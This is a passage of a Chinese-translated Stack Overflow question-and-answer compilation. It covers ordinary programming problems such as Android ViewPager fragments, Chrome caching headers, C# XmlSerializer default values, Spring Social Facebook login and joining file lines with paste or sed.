        this.isLoadingData = isLoadingData;
    }

    @Override
    public boolean isLoadingData() {
        return isLoadingData;
    }

    @Override
    public Fragment getProgessElement() {
        if (progressElement == null) {
            progressElement = new ProgressFragment();
        }
        return progressElement;
    }

    public static class ProgressFragment extends SherlockFragment {

        public ProgressFragment() {
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                Bundle savedInstanceState) {

            TextView progressView = new TextView(container.getContext());
            progressView.setGravity(Gravity.CENTER_HORIZONTAL
                    | Gravity.CENTER_VERTICAL);
            progressView.setText(R.string.loading_more_data);
            LayoutParams params = new LayoutParams(LayoutParams.FILL_PARENT,
                    LayoutParams.FILL_PARENT);
            progressView.setLayoutParams(params);

            return progressView;
        }
    }
} 
```

下面的`onPageSelected()`回调，如果需要，它基本上会启动 api 调用：

```
 @Override
    public void onPageSelected(int currentPosition) {
        updatePagerIndicator(currentPosition);
        activity.invalidateOptionsMenu();
        if (requestNextApiPage(currentPosition)) {
            pagerAdapter.setLoadingData(true);
            requestNextPageController.requestNextPageOfData(this);
        } 
```

现在，还值得一提的是，API 调用在传递结果后做了什么。这是回调：

```
@Override
public boolean onTaskSuccess(Context arg0, List<DataItem> result) {
    data = result;
    pagerAdapter.setLoadingData(false);
    pagerAdapter.setData(result);
    activity.invalidateOptionsMenu();

    return true;
} 
```

好的，现在因为该`setData()`方法调用`notifiyDataSetChanged()`，这将为`getItemPosition()`当前在`currentFragments`数组中的片段调用 。当然，对于它返回的进度元素，`POSITION_NONE`因为我想删除这个页面，所以这基本上是`destroyItem()`从`PagedSingleDataAdapter`. 如果我不旋转屏幕，一切正常，但正如我所说，如果我在显示进度元素并且 API 调用尚未完成时旋转它，`destroyItem()`则将在活动重新启动后调用回调。

`ViewPager`也许我还应该说我`OutterFragment`将`ViewPager`. 我`pagerAdapter`在`onActivityCreated()`回调中实例化`OutterFragment`并使用，`setRetainInstance(true)`这样当屏幕旋转时`pagerAdapter`保持不变（什么都不应该改变，对吧？），代码在这里：

```
if (pagerAdapter == null) {
    pagerAdapter = new PagedSingleDataAdapter(this, data);
}
pager.setAdapter(pagerAdapter);

if (savedInstanceState == null) {
    pager.setOnPageChangeListener(this);
    pager.setCurrentItem(currentPosition);
} 
```

现在总结一下，**问题**是：

如果我尝试从`ViewPager`实例化后的进度元素中删除它并且活动被销毁并重新创建（屏幕方向更改）我得到上述异常（`pagerAdapter`保持不变，因此其中的所有内容也保持不变，引用等......因为未销毁的`OutterFragment`主机`pagerAdapter`仅与活动分离，然后重新连接）。可能它发生在片段管理器上，但我真的不知道是什么。

**我已经尝试过的：**

1.  尝试使用另一种技术删除我的进度片段，即在`onTaskSuccess()`我试图从片段管理器中删除片段的回调中，没有奏效。

2.  我还尝试隐藏进度元素，而不是从片段管理器中完全删除它。这工作了 50%，因为视图不再存在，但我有一个空页面，所以这不是我真正想要的。

3.  我还尝试`progressFragment`在屏幕方向更改后（重新）将其附加到片段管理器，这也不起作用。

4.  在重新创建活动后，我还尝试将进度片段删除然后再次添加到片段管理器，但没有奏效。

5.  试图`destroyItem()`从回调中手动`onTaskSuccess()`调用（这真的非常难看）但没有奏效。

对不起，这么长的帖子，但我试图尽可能地解释这个问题，以便你们能够理解它。

任何解决方案，建议都非常感谢。

谢谢！

**更新：解决方案** 确定，所以这需要一段时间。问题是在进度片段上调用了 destroyItem() 回调两次，一次是在屏幕方向改变时，一次是在 api 调用完成后。这就是为什么例外。我找到的解决方案如下：继续跟踪 api 调用是否完成，并在这种情况下销毁进度片段，代码如下。

```
@Override
        public void destroyItem(ViewGroup container, int position, Object object) {
            if (object.equals(progressElement) && apiCallFinished == true) {
                apiCallFinished = false;
                currentFragments.put(position, currentFragments.get(position + 1));
                super.destroyItem(container, position, object);
            } else if (!(object.equals(progressElement))) {
                currentFragments.put(position, null);
                super.destroyItem(container, position, object);
            }
        } 
```

然后这个 apiCallFinished 在适配器的构造函数中设置为 false，在`onTaskSuccess()`回调中设置为 true。它真的有效！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T19:23:52.540

**更新：解决方案**确定，所以这需要一段时间。问题是在进度片段上调用了 destroyItem() 回调两次，一次是在屏幕方向改变时，一次是在 api 调用完成后。这就是为什么例外。我找到的解决方案如下：继续跟踪 api 调用是否完成，并在这种情况下销毁进度片段，代码如下。

```
@Override
        public void destroyItem(ViewGroup container, int position, Object object) {
            if (object.equals(progressElement) && apiCallFinished == true) {
                apiCallFinished = false;
                currentFragments.put(position, currentFragments.get(position + 1));
                super.destroyItem(container, position, object);
            } else if (!(object.equals(progressElement))) {
                currentFragments.put(position, null);
                super.destroyItem(container, position, object);
            }
        } 
```

然后这个 apiCallFinished 在适配器的构造函数中设置为 false，在 onTaskSuccess() 回调中设置为 true。它真的有效！

# ios - 在 iPod 或 iPhone 屏幕上推送时如何设置不同位置的文本

> ID：15357585
> 
> 赞同：0
> 
> 时间：2013-03-12T09:33:10.857
> 
> 标签：ios, rest, passbook

我只是创建了一些通行证并添加了一些位置，但我不知道为不同的位置设置文本。怎么做 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:55:41.447

您只需为`relevantText`您的`pass.json`.

```
"locations": [{
        "latitude": 22.284664905736,
        "longitude": 114.15818423018,
        "relevantText": "Visit our ifc branch"
    }, {
        "latitude": 22.2864734223,
        "longitude": 114.16105383063,
        "relevantText": "Come see us at Star Ferry"
    }, {
        "latitude": 22.282069510469,
        "longitude": 114.15340739122,
        "relevantText": "We're here in Shelly St"
    }, {
        "latitude": 22.280349497127,
        "longitude": 114.17643496924,
        "relevantText": "Find us in Brim 28"
    }], 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T19:24:51.157

要添加到 PassKit 的答案的一点是 - 你可以容纳大约。您的相关文本字符串中包含 23 个文本字符 - 任何其他字符都不适合锁定屏幕并被截断..

# caching - 无法缓存 main_frame 请求

> ID：15357587
> 
> 赞同：2
> 
> 时间：2013-03-12T09:33:14.413
> 
> 标签：caching, http-headers, cache-control

我正在开发一个修改 http 响应标头的 chrome 扩展。 [https://chrome.google.com/webstore/detail/super-cache/fglobbnbihckpkodmeefhagijjcjnbeh/details](https://chrome.google.com/webstore/detail/super-cache/fglobbnbihckpkodmeefhagijjcjnbeh/details)

我无法缓存 main_frame 请求。不过，我能够控制静态请求的缓存。

例如，如果我点击[http://apple.com](http://apple.com)，我会收到 main_frame 的以下标头。

```
Accept-Ranges:bytes
Cache-Control:max-age=276
Connection:keep-alive
Content-Encoding:gzip
Content-Length:3310
Content-Type:text/html; charset=UTF-8
Date:Tue, 12 Mar 2013 09:24:12 GMT
Expires:Tue, 12 Mar 2013 09:28:48 GMT
Server:Apache
Vary:Accept-Encoding 
```

但是每次我点击 url 时，浏览器都会尝试访问服务器并最终收到 200 响应。我已经尝试了所有可能的组合，可以将标头设置为在 main_frame 上启用缓存。

我希望当用户从 chrome 的导航栏中点击 url 并且没有发出请求时。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T11:51:50.117

您在响应标头中缺少某种缓存验证。`ETag`标头可用于控制它，方法是向其添加可识别唯一响应的值。您可以在[Apache ETag 文档](https://httpd.apache.org/docs/2.2/mod/core.html#fileetag)中阅读一些有关它的信息，但我会`ETag: [filename]`在您的示例中简单地包含在您的响应标头中：

```
Accept-Ranges:bytes
Cache-Control:max-age=276
Connection:keep-alive
Content-Encoding:gzip
Content-Length:3310
Content-Type:text/html; charset=UTF-8
Date:Tue, 12 Mar 2013 09:24:12 GMT
Expires:Tue, 12 Mar 2013 09:28:48 GMT
Server:Apache
ETag: File:"somefile.html"
Vary:Accept-Encoding 
```

这些`ETag`值可以包括几乎任何东西，例如文件名、文件大小、自定义值……可以用分号分隔`;`。如果值包含空格，则将它们括在双引号中`"`。例如：

```
ETag: File:"YouTube_cd_Fdly3rX8.jpg"; Size:12169 
```

连同`Cache-Control`,`Expires`和其他一些可能改变的头值（当被包含并且浏览器知道如何解释它们时）将构成浏览器缓存验证器的基础。

查看您的示例响应标头，您可能希望将*max-age*值`Cache-Control`增加到更高的值，因为您的示例表明它们应该仅在客户端缓存 276 秒。标`Expires`头值似乎也有点短。

有关如何设置这些值以及浏览器如何验证缓存控制标头的更多信息，请参阅[RFC2616 第 14.9 节](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9)。

**编辑：**在进一步调试、检查和重新检查 Chrome 缓存验证的行为后，事实证明它确实不尊重正确设置的`Cache-Control`响应标头。应 OP 的要求，我已将此问题报告给 Chrome 支持：

> **铬，版本 25.0.1364.172 m**
> 
> 从 Web 服务器提供静态文件时，不尊重主文档请求上的 Cache-Control，同时尊重链接内容的相同标头响应。
> 
> **测试设置：**
> 
> 从 Web 服务器请求静态 HTML 文档（MIME 文本/html），其中包含另一个带有 IFRAME 的静态 HTML 文档（也是 MIME 文本/html）。IFRAME 提供的文档具有与主文档相同的响应标头，由 Web 服务器响应附加到它：
> 
> ```
> Date: Thu, 21 Mar 2013 16:29:28 GMT
> Expires: Thu, 21 Mar 2013 16:33:59 GMT
> Cache-Control: max-age=301, max-stale=299, only-if-cached 
> ```
> 
> **预期行为：**
> 
> 主文档和在 IFRAME 中提供的文档将在本地缓存，初始请求的持续时间至少为 301（max-age）秒，对于正常（非强制）加载请求，额外的 299（max-stale）秒。在这个 301 秒的时间范围内的任何后续请求不会使本地缓存失效（例如使用 CTRL+F5 强制刷新或重新加载上下文菜单命令）并且由正常的页面加载请求（例如重新进入地址栏中的相关 URL）将从本地缓存加载状态消息 200 OK（来自缓存），如果没有本地缓存​​控制信息指示它，否则（相同的 URL，在有效的缓存时间范围内请求，文档是标记为正确缓存在其响应标头中）。
> 
> **问题：**
> 
> 主文档未通过其缓存副本加载，并且向 Web 服务器发出附加请求，导致状态代码 304 Not Modified。然而，IFRAME 中的文档是从本地缓存正确加载的，并导致状态消息 200 OK（来自缓存）。
> 
> **笔记：**
> 
> 没有任何缓存控制标记或其值的任何组合似乎对主文档的本地缓存行为有任何积极影响。包含一个非唯一的 ETag 值也不能解决缓存主文档的问题。其他主要供应商浏览器（在 IE、Firefox、Opera 中测试）尊重主文档上的 Cache-Control 标头。

# c# - 如何告诉 XmlSerializer 总是用 [DefautValue(...)] 序列化属性？

> ID：15357589
> 
> 赞同：16
> 
> 时间：2013-03-12T09:33:16.123
> 
> 标签：c#, winforms, xml-serialization, default-value

我正在使用`DefaultValue`属性来实现正确的`PropertyGrid`行为（它以粗体显示与默认值不同的值）。现在，如果我想使用 序列化显示的对象，则`XmlSerializer`xml 文件中将没有具有默认值的属性的条目。

**告诉 XmlSerializer 序列化这些的最简单方法是什么？**

我需要它来支持“版本”，所以当我稍后在代码中更改默认值时 - 序列化属性获取它已经序列化的值，而不是“最新”的值。我可以考虑以下几点：

*   `PropertyGrid`（使用自定义属性，因此将被忽略）的覆盖行为`XmlSerializer`；
*   做一些自定义的 xml 序列化，其中 ignore `DefaultValue`'s;
*   在将对象传递给之前对它做一些事情，`XmlSeriazer`这样它就不会再包含`DefaultValue`'s 了。

但是我有可能会错过一些秘密属性，它可以让我在没有太多痛苦的情况下做到这一点=D。

这是我想要的一个例子：

```
 private bool _allowNegative = false;
    /// <summary>
    /// Get or set if negative results are allowed
    /// </summary>
    [Category(CategoryAnalyse)]
    [Admin]
    [TypeConverter(typeof(ConverterBoolOnOff))]
    //[DefaultValue(false)] *1
    public bool AllowNegative
    {
        get { return _allowNegative; }
        set
        {
            _allowNegative = value;
            ConfigBase.OnConfigChanged();
        }
    }
    //public void ResetAllowNegative() { _allowNegative = false; } *2
    //public bool ShouldSerializeAllowNegative() { return _allowNegative; } *3
    //public bool ShouldSerializeAllowNegative() { return true; } *4 
```

如果我取消注释 (*1)，那么我将获得所需的效果`PropertyGrid`- 具有默认值的属性以普通文本显示，否则文本为粗体。但是`XmlSerializer`不会将具有默认值的属性放入 xml 文件中，这很**糟糕****（**我正在尝试修复它）。

 **如果我取消注释 (*2) 和 (*3)，那么它与取消注释 (*1) 完全一样。

如果我取消注释 (*2) 和 (*4)，那么`XmlSerializer`将始终将属性放入 xml 文件中，但这是因为它们**不再具有默认值**并`PropertyGrid`以粗体文本显示所有值。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-28T13:10:58.367

只要您不需要 Xml 中的属性，如果您改用[DataContractSerializer](http://msdn.microsoft.com/en-gb/library/system.runtime.serialization.datacontractserializer.aspx)，您将获得所需的行为。

```
[DataContract]
public class Test
{
    [DataMember]
    [DefaultValue(false)]
    public bool AllowNegative { get; set; }
}

void Main()
{
    var sb2 = new StringBuilder();
    var dcs = new DataContractSerializer(typeof(Test));

    using(var writer = XmlWriter.Create(sb2))
    {
        dcs.WriteObject(writer, new Test());
    }

    Console.WriteLine(sb2.ToString());  
} 
```

产生（减去命名空间等）

```
<Test>
    <AllowNegative>false</AllowNegative>
</Test> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T22:44:41.040

您可以使用两个属性：

```
// For property grid only:
[Category(CategoryAnalyse)]
[TypeConverter(typeof(ConverterBoolOnOff))]
[DefaultValue(false)]
[XmlIgnore]
public bool AllowNegative
{
    get { return _allowNegative; }
    set
    {
        _allowNegative = value;
        ConfigBase.OnConfigChanged();
    }
}

// For serialization:
[Browsable(false)]
[EditorBrowsable(EditorBrowsableState.Never)]
[TypeConverter(typeof(ConverterBoolOnOff))]
[XmlElement("AllowNegative")]
public bool AllowNegative_XML
{
    get { return _allowNegative; }
    set
    {
        _allowNegative = value;
        ConfigBase.OnConfigChanged();
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-27T17:20:38.727

我相信您正在寻找的是[`ShouldSerialize()`and`Reset()`](http://msdn.microsoft.com/en-us/library/53b8022e.aspx)。使用这些将进一步扩展您的类（每个属性有两个函数），但是，它专门实现了您正在寻找的东西。

这是一个简单的例子：

```
// your property variable
private const String MyPropertyDefault = "MyValue";
private String _MyProperty = MyPropertyDefault;

// your property
// [DefaultValueAttribute("MyValue")] - cannot use DefaultValue AND ShouldSerialize()/Reset()
public String MyProperty
{
    get { return _MyProperty; }
    set { _MyProperty = value; }
}

// IMPORTANT!
// notice that the function name is "ShouldSerialize..." followed
// by the exact (!) same name as your property
public Boolean ShouldSerializeMyProperty()
{
    // here you would normally do your own comparison and return true/false
    // based on whether the property should be serialized, however,
    // in your case, you want to always return true when serializing!

    // IMPORTANT CONDITIONAL STATEMENT!
    if (!DesignMode)
        return true; // always return true outside of design mode (is used for serializing only)
    else
        return _MyProperty != MyPropertyDefault; // during design mode, we actually compare against the default value
}

public void ResetMyProperty()
{
    _MyProperty = MyPropertyDefault;
} 
```

请注意，由于您希望保持 PropertyGrid 功能完整，因此您必须*知道*在调用该函数时是否正在序列化`ShouldSerialize()`。我建议您实现某种在序列化时设置的控制标志，因此**总是`return true`**.

* * *

请注意，您**不能**将`DefaultValue`属性与`ShouldSerialize()`and`Reset()`函数一起使用（*您只能使用 or*）。

* * *

**编辑：**`ShouldSerialize()`为功能添加说明。

因为目前**没有**办法序列化一个默认值并让 PropertyGrid 知道一个属性有它的默认值，所以您必须实现一个条件来检查您是否处于设计模式。

假设您的类从`Component`or派生`Control`，您有一个属性，该属性*仅*`DesignMode`在设计时由 Visual Studio 设置。条件如下：

 *```
if (!DesignMode)
    return true; // always return true outside of design mode (is used for serializing only)
else
    return _MyProperty != MyPropertyDefault; // during design mode, we actually compare against the default value 
```

* * *

**编辑 2：**我们不是在谈论 Visual Studio 的设计模式。

记住上面的代码，创建另一个名为`IsSerializing`. 在调用**之前**将`IsSerializing`属性设置为，*之后*取消设置。`true` **`XmlSerializer.Serialize`**

 ***最后，将`if (!DesignMode)`条件语句更改为`if (IsSerializing)`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-11-12T18:05:03.010

`XmlSerializer`可以用 [XmlAttributeOverrides](http://msdn.microsoft.com/de-de/library/system.xml.serialization.xmlattributeoverrides(v=vs.110).aspx)覆盖 can的这种行为

[我从这里](http://objectmix.com/xml-soap/343227-force-default-values-serialization.html)借用了这个想法：

```
static public XmlAttributeOverrides GetDefaultValuesOverrides(Type type)
{
    XmlAttributeOverrides explicitOverrides = new XmlAttributeOverrides();

    PropertyDescriptorCollection c = TypeDescriptor.GetProperties(type);
    foreach (PropertyDescriptor p in c)
    {
        AttributeCollection attributes = p.Attributes;
        DefaultValueAttribute defaultValue = (DefaultValueAttribute)attributes[typeof(DefaultValueAttribute)];
        XmlIgnoreAttribute noXML = (XmlIgnoreAttribute)attributes[typeof(XmlIgnoreAttribute)];
        XmlAttributeAttribute attribute = (XmlAttributeAttribute)attributes[typeof(XmlAttributeAttribute)];

        if ( defaultValue != null && noXML == null )
        {
            XmlAttributeAttribute xmlAttribute = new XmlAttributeAttribute(attribute.AttributeName);
            XmlAttributes xmlAttributes = new XmlAttributes();
            xmlAttributes.XmlAttribute = xmlAttribute;
            explicitOverrides.Add(userType, attribute.AttributeName, xmlAttributes);
        }
    }
    return explicitOverrides;
} 
```

并让我自己成为一个属性来装饰应该发出默认值的类。如果您想对所有课程都这样做，我相信您可以调整整个概念。

```
Public Class EmitDefaultValuesAttribute
    Inherits Attribute
    Private Shared mCache As New Dictionary(Of Assembly, XmlAttributeOverrides)

    Public Shared Function GetOverrides(assembly As Assembly) As XmlAttributeOverrides
        If mCache.ContainsKey(assembly) Then Return mCache(assembly)
        Dim xmlOverrides As New XmlAttributeOverrides
        For Each t In assembly.GetTypes()
            If t.GetCustomAttributes(GetType(EmitDefaultValuesAttribute), True).Count > 0 Then
                AddOverride(t, xmlOverrides)
            End If
        Next
        mCache.Add(assembly, xmlOverrides)
        Return xmlOverrides
    End Function

    Private Shared Sub AddOverride(t As Type, xmlOverrides As XmlAttributeOverrides)
        For Each prop In t.GetProperties()
            Dim defaultAttr = prop.GetCustomAttributes(GetType(DefaultValueAttribute), True).FirstOrDefault()
            Dim xmlAttr As XmlAttributeAttribute = prop.GetCustomAttributes(GetType(XmlAttributeAttribute), True).FirstOrDefault()
            If defaultAttr IsNot Nothing AndAlso xmlAttr IsNot Nothing Then
                Dim attrs As New XmlAttributes '= {New XmlAttributeAttribute}
                attrs.XmlAttribute = xmlAttr
                ''overide.Add(t, xmlAttr.AttributeName, attrs)
                xmlOverrides.Add(t, prop.Name, attrs)
            End If
        Next
    End Sub 
```

因为`xsd.exe`产生部分类，您可以将其添加`EmitDefaultValuesAttribute`到单独的文件中：

```
<EmitDefaultValuesAttribute()>
Public MyClass
    Public Property SubClass() As MySubClass
End Class

<EmitDefaultValuesAttribute()>
Public MySubClass
End Class 
```

用法如下：

```
Dim serializer As New XmlSerializer(GetType(MyClass), EmitDefaultValuesAttribute.GetOverrides(GetType(MyClass).Assembly)) 
```******

# c# - oledbcommandbuilder.driveparameters 获取重复的存储过程参数计数

> ID：15357590
> 
> 赞同：0
> 
> 时间：2013-03-12T09:33:16.590
> 
> 标签：c#, asp.net

将新转储导入到 oracle db 后，类`oledbcommandbuilder.driveparameters`中存在的`sqlhelperparametercache`返回重复参数计数导致异常：

> 参数计数与参数值计数不匹配

目前，我必须使用**架构/所有者**名称来获取程序的有效参数计数，而我之前没有。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T14:17:39.897

如果您有多个具有相同结构的架构，则必须使用所有者名称，否则会出现此错误，因为它认为每个架构中的每个过程都不​​同，因此它将返回其输入参数的总和。

# javascript - jQuery UI 工具提示，我可以从中复制文本吗？

> ID：15357594
> 
> 赞同：3
> 
> 时间：2013-03-12T09:33:25.853
> 
> 标签：javascript, jquery, jquery-ui

在我当前的项目中，我使用 jQuery UI 的工具提示来显示附加信息。在这个项目中，我有一些表格，其中某些列的文本不适合，所以其中一部分被隐藏了。我正在考虑使用类似 jQuery 工具提示的东西，所以当用户将鼠标放在剪切单元格上时，工具提示会显示完整的文本。问题是用户将无法选择文本。

有人知道是否可以配置 jQuery UI 工具提示以使复制/剪切文本或任何其他对我有用的插件成为可能？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:41:07.800

最后，我这样做了：

CSS

```
.overflow_hidden_cell{
    overflow: hidden;
    white-space: nowrap;
}
.overflow_hidden_cell_hover{
    overflow: visible;
    width: 300px;
    position: absolute;

    -webkit-box-shadow: 0px 0px 15px rgba(50, 50, 50, 0.7);
    -moz-box-shadow:    0px 0px 15px rgba(50, 50, 50, 0.7);
    box-shadow:         0px 0px 15px rgba(50, 50, 50, 0.7);

} 
```

JS

```
function setOverflowCells(){
    $('.overflow_hidden_cell').bind('mouseover', function(){
        $(this).addClass('overflow_hidden_cell_hover');
    }).bind('mouseleave', function(){
        $(this).removeClass('overflow_hidden_cell_hover');
    });
} 
```

我将“.overflow_hidden_​​cell”类赋予每个文本可能太长的单元格。我希望这可以帮助任何有同样问题的人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:37:13.363

您不能复制工具提示，但您确实有其他选择。如果您将“onclick”或“onmouseover”添加到缩短的文本中，您可以使用 jquery 插件将其复制到剪贴板。 [http://bradleysepos.com/projects/jquery/clipboard/](http://bradleysepos.com/projects/jquery/clipboard/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-20T17:41:01.977

您可以使用 jquery ui 工具提示执行此操作，并稍作调整。以下对另一个问题的回答恰好解决了这个问题（对我有用）：

[https://stackoverflow.com/a/15014759/867704](https://stackoverflow.com/a/15014759/867704)

或者，“Jquery Tools”工具提示是一个插件，它提供了一个工具提示，默认情况下可以复制其文本：

[http://jquerytools.org/documentation/tooltip/](http://jquerytools.org/documentation/tooltip/)

# c++ - BSDF - 需要一个例子

> ID：15357596
> 
> 赞同：0
> 
> 时间：2013-03-12T09:33:26.663
> 
> 标签：c++, graphics, 3d, rendering, raytracing

我试图在一个简单的光线追踪器中理解[BSDF](http://en.wikipedia.org/wiki/Bidirectional_scattering_distribution_function)函数的作用，理论上我明白了，但实际上我不知道如何实现它。

有人可以指出一些简单的例子（如果可能的话，解释清楚）如何使用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:54:59.070

检查 PBRT 项目。这是一本很棒的书，但是如果您不想阅读它，可以使用文档齐全的源代码：[PBRT](http://www.pbrt.org/)

# android - 对话框内的 TabHost ..？

> ID：15357612
> 
> 赞同：0
> 
> 时间：2013-03-12T09:34:03.340
> 
> 标签：android, dialog, android-tabhost

我可以在对话框中使用 TabHost。我的应用程序扩展了活动（不是选项卡活动）。另一个问题是如何在按下选项卡时调用函数。

请给我一个简单的例子。

提前致谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-12T10:08:23.623

是的，我们可以在 Dialog 中调用 Tab Host：

```
 button.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View arg0) {
            // TODO Auto-generated method stub
        Toast.makeText(context, "dialog", 1).show();    
                   // custom dialog
                    final Dialog dialog = new Dialog(context);
                    dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
                    dialog.setContentView(R.layout.dialo);
                    dialog.setTitle("Title...");

                    TabHost tabs = (TabHost) dialog.findViewById(R.id.tabhost);

                    tabs.setup();

                    TabHost.TabSpec tabpage1 = tabs.newTabSpec("one");
                    tabpage1.setContent(R.id.tabview1);
                    tabpage1.setIndicator("",getResources().getDrawable(R.drawable.one));

                    TabHost.TabSpec tabpage2 = tabs.newTabSpec("two");
                    tabpage2.setContent(R.id.tabview2);
                    tabpage2.setIndicator("",getResources().getDrawable(R.drawable.two));

                    tabs.addTab(tabpage1);
                    tabs.addTab(tabpage2);

                    dialog.show();
                  }
    }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:42:13.267

制作一个 HostTab 布局并命名每个线性/相对布局并声明我创建的每个选项卡以使用它们声明的 xml 文件中的线性/相对布局......

```
dialog.setContentView(R.layout.maintabmenu);
TabHost tabs = (TabHost) dialog.findViewById(R.id.my_tabhost);
tabs.setup();
tabs.setCurrentTab(0);

TabSpec tspec11 = tabs.newTabSpec("Tab1");
tspec11.setIndicator("NEWTAB");

tspec11.setContent(R.id.ScrollView01);
tabs.addTab(tspec11);

TabSpec tspec2 = tabs.newTabSpec("Tab2");
tspec2.setIndicator("NEWTAB");

tspec2.setContent(R.id.ScrollView02);
tabs.addTab(tspec2); 
```

# java - 使用数据库和社交网站登录

> ID：15357615
> 
> 赞同：2
> 
> 时间：2013-03-12T09:34:05.357
> 
> 标签：java, facebook, spring, jakarta-ee, spring-security

我有一个拼车网站，用户可以通过我的数据库登录，一切正常。

登录后，用户可以发布拼车广告。

现在我的需求是让用户通过 Facebook 登录。这种情况如何处理？

案例 1：用户未在我的数据库中注册并使用 Facebook 凭据。我可以显示只读页面，但现在说用户要发布广告，在这种情况下我该怎么办？

我的数据库的结构使得 postAd 表具有 user_id 作为外键，所以在这种情况下，我应该添加一个具有该 email_id 的用户和一个虚拟密码以允许他们发布吗？或者如何处理这种情况？

案例 2：如果用户使用 Facebook 登录，我是否需要使用该电子邮件 ID 在我的数据库中搜索才能找到该用户？

我正在使用 Spring 安全性。

这样的网站通常如何运作？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:53:29.633

查看[Spring Social](http://www.springsource.org/spring-social)和[Spring Social Facebook](http://static.springsource.org/spring-social-facebook/docs/1.0.x/reference/html/)项目。他们是这样：

1.  对于案例 1：有[隐式注册功能](http://static.springsource.org/spring-social/docs/1.0.x/reference/html/signin.html#signin_signup_implicit)。您必须提供 ConnectionSignUp 实现，该实现将在 FB 连接建立但 DB 中没有相应用户时调用。您可以在此处创建新的数据库用户。
2.  对于案例 2：有一个 SignInAdapter 接口（请参阅[ProviderSignInController 的依赖](http://static.springsource.org/spring-social/docs/1.0.x/reference/html/signin.html#d4e851)项章节 ）。您可以通过 userId 找到 DB 用户，然后准备 autentication 并将其注入 SecurityContextHolder。

总体思路：您可以拥有多个提供者（FB、Twitter 等），但在任何情况下，每个社交资料都将与某个 Spring Security 用户匹配（例如，将用于授权）。如果它们通过 userId 匹配，那么您可以为多个社交帐户拥有一个 Spring Security 用户。这种方法的优点是您可以更好地控制用户配置文件（即使 FB 帐户处于活动状态，您也可以禁用本地用户帐户）。您可以从 Java 代码中使用 Facebook API。

作为选项 2，您可以通过 JavaScript 进行 FB 登录。然后手动实现案例 1 和案例 2 的两个功能（例如通过自定义过滤器）。它可能更轻量级（取决于您需要哪些功能）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T06:24:32.770

Facebook Oauth 为每个用户提供一个唯一的用户 ID。因此，如果用户使用 facebook 登录，最好将用户的详细信息（例如 ID、姓名、电子邮件等）存储在用户表中。所以，您可以使用该用户 ID 作为主键...如果用户已经存在 jsut 跳过这部分并将它们带到发布页面..

# bash - 如何从文件行编写自定义命令行参数？

> ID：15357617
> 
> 赞同：1
> 
> 时间：2013-03-12T09:34:11.653
> 
> 标签：bash, command-line

我知道该`xargs`实用程序，它允许我将行转换为多个参数，如下所示：

```
echo -e "a\nb\nc\n" | xargs 
```

结果是：

```
a b c 
```

但我想得到：

```
a:b:c 
```

该字符`:`用于示例。我希望能够在行之间插入任何分隔符以获得单个参数。我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:45:54.510

你给出的例子对我不起作用。你需要：

```
echo -e "a\nb\nc\n" | xargs 
```

得到`a b c`.

回到你的需要，你可以这样做：

```
echo "a b c" | awk 'OFS=":" {print $1, $2, $3}' 
```

它会将分隔符从空格更改为`:`您想要的任何内容。

您还可以使用`sed`：

```
echo "a b c" | sed -e 's/ /:/g 
```

那将输出`a:b:c`。

经过所有这些数据处理后，您就可以使用`xargs`来执行您想要的命令了。只是`| xargs`做任何你想做的事。

希望能帮助到你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T10:25:12.453

如果您有一个包含多行的文件，而不是您想更改为单个参数，将 NEWLINES 更改为单个字符，则该`paste`命令就是您所需要的：

```
$ echo -en "a\nb\nc\n" | paste -s -d ":"
a:b:c 
```

然后，您的命令变为：

```
your_command "$(paste -s -d ":" your_file)" 
```

**编辑：**

如果要插入多个字符作为分隔符，可以使用`sed`before `paste`：

```
your_command "$(sed -e '2,$s/^/<you_separator>/' your_file | paste -s -d "")" 
```

或者使用一个更复杂的`sed`：

```
your_command "$(sed -n -e '1h;2,$H;${x;s/\n/<you_separator>/gp}' your_file)" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T10:23:04.227

您可以使用 加入行`xargs`，然后使用 替换空格（`' '`） `sed`。

`echo -e "a\nb\nc"|xargs| sed -e 's/ /:/g'`

将导致

`a:b:c`

显然，您可以将此输出用作其他命令的参数，使用另一个`xargs`.

`echo -e "a\nb\nc"|xargs| sed -e 's/ /:/g'|xargs`

# java - Maven：部署后检查网站是否正在运行

> ID：15357624
> 
> 赞同：0
> 
> 时间：2013-03-12T09:34:43.540
> 
> 标签：java, maven, tomcat

我有一个远程 Tomcat 服务器并配置了 maven 项目，我可以使用`maven tomcat:redeploy`. 但是，如果在应用程序启动过程中出现一些运行时错误（例如应用程序无法连接数据库） - 尽管部署过程成功，但它不会启动。

我想检查已部署的网站是否已启动并使用 maven 运行（例如，通过检查 HTTP 200 状态的所需应用程序 URL）。如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:40:02.783

您的 Web 应用程序必须有一个索引文件，您可以将其放入 web.xml 文件中的欢迎文件列表中。当您点击应用程序 URL 时，您将看到该索引页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:39:40.130

检查应用程序是否正在运行的示例代码

```
